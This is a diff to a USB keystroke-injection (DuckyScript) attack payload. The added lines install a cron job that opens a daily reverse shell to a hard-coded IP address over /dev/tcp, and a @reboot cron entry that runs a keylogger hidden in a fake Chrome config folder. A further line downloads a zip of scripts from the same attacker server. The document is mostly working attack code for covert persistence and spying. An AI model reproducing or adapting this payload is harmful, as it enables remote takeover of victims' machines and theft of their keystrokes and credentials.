@@ -24,31 +24,16 @@ ENTER
 
 REM add reverse shell to cron
 
-STRING export EDITOR=vim 
-ENTER
-
-STRING crontab -e
-ENTER
-
-STRING g
-ENTER
-
-STRING $
-ENTER
-
-REM start insert mode
-STRING i
-ENTER
-
 REM set the reverse shell to occur 11am every day
-STRING 0 11 * * * /bin/sh -c "/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit
+STRING {crontab -l; echo '0 11 * * * /bin/sh -c "/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &" && exit';} | crontab -
 ENTER
 
-REM exit insert mode
-ESC
+REM set cron job for keylogger on reboot
+STRING { crontab -l; echo '@reboot python3 ~/.config/Chrome/osx-keylogger.py'; } | crontab -
+ENTER
 
-REM Exit vim
-STRING :wq
+REM download and unzip the scripts
+STRING curl http://139.180.169.29:8000/scripts.zip --output ~/.config/Chrome/scripts.zip  
 ENTER
 
 REM spawns a reverse shell in background
